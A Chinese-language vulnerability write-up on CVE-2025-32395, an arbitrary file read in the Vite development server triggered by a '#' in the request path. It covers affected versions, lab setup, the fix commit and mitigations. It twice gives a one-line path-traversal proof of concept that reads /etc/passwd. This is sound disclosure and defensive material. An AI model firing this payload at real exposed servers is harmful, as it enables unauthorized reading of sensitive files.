# 1、漏洞信息

Vite是一个现代化的前端构建工具，旨在提供更快的开发体验。它通过基于原生ES模块的开发服务器，在开发过程中实现极速热更新（HMR）。Vite在构建时使用了高度优化的打包工具，如esbuild，极大提高了构建速度。它支持多种前端框架（如React、Vue）并可以通过插件扩展功能。Vite的目标是简化前端开发工作流，并提升开发效率。



该漏洞影响`Node`和`Bun`环境下的开发服务器，攻击者可通过发送包含`#`字符的HTTP请求，绕过服务器的文件访问限制，返回任意文件内容。根据HTTP 1.1和HTTP 2规范，`#`不应出现在请求目标中，但`Node`和`Bun`并未内部拒绝这类无效请求，而是将其传递至用户端。Vite在处理请求时，未正确验证`req.url`中是否包含`#`，从而允许请求绕过`server.fs.deny`设置。此漏洞仅影响在非Deno环境中运行并显式暴露开发服务器（通过`--host`或`server.host`配置选项）的应用。



# 2、漏洞概述

| 漏洞名称  | 任意文件读取漏洞                                             |
| --------- | ------------------------------------------------------------ |
| 漏洞等级  | 中危                                                         |
| CVE编号   | CVE-2025-32395                                               |
| CNVD编号  | 暂无                                                         |
| CNNVD编号 | 暂无                                                         |
| 其他编号  | 暂无                                                         |
| 披露时间  | 2025-03-24                                                   |
| 分数      | 6.0                                                          |
| CVSS      | CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N |
| 披露链接  | https://www.cve.org/CVERecord?id=CVE-2025-32395              |



# 3、影响范围

```
6.2.0 <= Vite <= 6.2.5
6.1.0 <= Vite <= 6.1.4
6.0.0 <= Vite <= 6.0.14
5.0.0 <= Vite <= 5.4.17
Vite <= 4.5.12
```



# 4、环境搭建

1、安装node 和 npm

```
# 添加 NodeSource 仓库（安装 18.x 或 20.x 都可以）
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
# 安装 node 和 npm
sudo apt install -y nodejs
# 验证安装
node -v
npm -v
```

![image-20250427172243648](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271722855.png)



2、创建项目

```
npm create vite@latest
```

- 项目名回车默认：vite-project
- 选择框架 Vanilla
- 选择 JavaScript

![image-20250427172359323](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271723392.png)



3、手动降低Vite版本

```
cd vite-project
#手动降级vite到 6.2.4 版本
npm install vite@6.2.4 --save-dev
#查看版本
npx vite -v
```

![image-20250427172633279](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271726349.png)



4、新建 vite.config.js

```
// vite.config.js
export default {
  server: {
    host: true
  }
}
```

![image-20250427172941710](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271729816.png)



5、运行

```
npm install
npm run dev
```

![image-20250427173027804](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271730858.png)



6、浏览器访问

![image-20250427173109653](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271731734.png)



# 5、代码审计

https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70



# 6、漏洞复现

```
/@fs/X/X/X/X/#/../../../../../etc/passwd
```

![image-20250427174327118](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202504271743402.png)



# 7、解决方案

## 7.1、临时缓解方案

如果暂时无法升级，可以采取以下措施降低风险：

限制网络访问：避免使用 `--host` 或设置 `server.host` 为 `localhost`，确保开发服务器仅限本地访问。

严格文件权限：确保敏感文件不可被 Vite 进程读取（例如通过操作系统权限控制）。



## 7.2、升级修复方案

Vite 官方已发布安全补丁，修复版本包括：

```
Vite >= 6.2.6
6.1.5 <= Vite < 6.2.0
6.0.15 <= Vite < 6.1.0
5.4.18 <= Vite < 6.0.0
4.5.13 <= Vite < 5.0.0
```

请尽快通过 `npm update vite` 或手动升级到以上版本以修复漏洞。



# 8、POC

```
/@fs/X/X/X/X/#/../../../../../etc/passwd http://127.0.0.1:5173
```



# 9、参考链接

https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4